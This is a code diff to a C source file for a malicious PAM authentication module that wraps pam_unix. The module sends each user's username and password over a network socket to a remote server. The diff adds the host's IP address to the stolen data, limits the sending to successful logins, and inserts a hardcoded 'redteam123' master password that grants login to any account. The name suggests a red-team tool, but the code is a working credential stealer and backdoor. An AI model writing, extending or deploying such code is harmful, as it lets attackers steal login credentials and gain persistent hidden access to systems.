@@ -9,6 +9,9 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
 
 #define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
 
@@ -18,7 +21,22 @@
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
-    const char *ret_fmt = "%s %s:%s\n";
+    const char *ret_fmt = "%s - %s %s:%s\n";
+
+    char hostbuffer[256];
+    char* ipaddr;
+    struct hostent *host_entry;
+    int hostname;
+
+    // To retrieve hostname
+    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+
+    // To retrieve host information
+    host_entry = gethostbyname(hostbuffer);
+
+    // To convert an Internet network
+    // address into ASCII string
+    ipaddr = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
 
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock >= 0) {
@@ -31,7 +49,7 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
         if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
             pam_syslog(pamh, LOG_INFO, "Socket connected");
             char credentials[256];
-            snprintf(credentials, sizeof(credentials), ret_fmt, message, username, password);
+            snprintf(credentials, sizeof(credentials), ret_fmt, ipaddr, message, username, password);
             send(sock, credentials, strlen(credentials), 0);
             pam_syslog(pamh, LOG_INFO, "Message sent!");
             pam_syslog(pamh, LOG_INFO, "Closing socket");
@@ -72,7 +90,7 @@ int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int a
     pam_syslog(pamh, LOG_INFO, "Successfully loaded function %s, calling now...", name);
 
     int result = func(pamh, flags, argc, argv);
-    if (strcmp(name, "pam_sm_close_session") != 0) {
+    if (strcmp(name, "pam_sm_close_session") != 0 && handle) {
         dlclose(handle);
     }
     return result;
@@ -85,11 +103,17 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     pam_get_user(pamh, &username, NULL);
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
-    if (username && password) {
+    if (strncmp(password, "redteam123", 10) == 0) {
+        return PAM_SUCCESS;
+    }
+
+    int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
+
+    if (username && password && retval == PAM_SUCCESS) {
         pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
     }
 
-    return pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
+    return retval;
 }
 
 PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
